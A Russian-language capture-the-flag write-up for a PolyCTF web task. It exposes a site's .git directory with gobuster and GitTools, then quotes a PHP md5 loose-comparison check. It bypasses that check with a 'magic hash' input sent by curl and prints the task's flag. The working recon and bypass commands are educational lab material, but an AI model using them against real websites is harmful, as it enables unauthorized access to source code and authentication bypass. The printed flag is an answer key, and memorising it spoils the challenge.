# **Write-up: PolyCTF - Начинающий жонглер (уязвимость Magic Hash)**

## **📌 Описание задания**
> Вам необходимо научиться самому важному трюку жонглера. Попадите на его представление и узнайте все секреты.

Нам дан веб-сайт, где можно ввести **код-ключ-сертификат** для получения билета.  
Однако при вводе неправильного кода система отвечает:  Вы ввели неверный код!

Наша цель — найти уязвимость, которая позволит нам **обойти проверку кода и получить флаг**.

---

## **🛠️ 1. Информационный сбор**
### 🔎 **Анализ веб-приложения**
Мы проверили код HTML:
```bash
curl -s http://tasks.polyctf.ru:30000/
```
Но ничего полезного не нашли.

Затем использовали Gobuster для поиска скрытых директорий:
```bash
gobuster dir -u http://tasks.polyctf.ru:30000/ -w /usr/share/wordlists/dirb/common.txt --exclude-length 3594
```
Результат:
Найден .git/HEAD → значит, .git открыт для скачивания!

## **🛠️ 2. Восстановление исходников через .git**
Скачиваем .git с помощью GitTools/Dumper:
```bash
git clone https://github.com/internetwache/GitTools.git
cd GitTools/Dumper
./gitdumper.sh http://tasks.polyctf.ru:30000/.git/ ~/dumped_repo
```
После завершения восстанавливаем файлы:
```bash 
cd ~/dumped_repo
git checkout .
ls -la
```

## **📂 Найдены файлы:**

index.php (ключевой файл)

Dockerfile, docker-compose.yml

## **🔎 3. Анализ кода index.php**

В коде обнаруживаем уязвимую проверку:
```bash 
if (md5($code) == "0e974114726967211511915142978119") {
    $err =  "PolyCTF{Fake_flag}";
} else {
    $err = "Вы ввели неверный код!";
}
```

## **❌ Проблема: приведение типов в PHP**
В PHP строка "0e974114726967211511915142978119" воспринимается как 0, потому что начинается с "0e" (научная нотация).

Если мы найдём строку, md5-хэш которой также выглядит как "0e...", PHP считает их равными.

## **🛠️ 4. Эксплуатация "Magic Hash"**
Мы знаем, что существуют известные строки, md5 которых дают "0e...".
Попробуем отправить запрос с одной из них:
```bash
curl -X POST http://tasks.polyctf.ru:30000/ -d "code=240610708"
```
## **✅ И как итог, сервер выдал флаг! 🎉**
```bash
PolyCTF{MD5_AnD_tyPE_jUG9L!n6_IN_PHP_@R3_7r!Cky}
```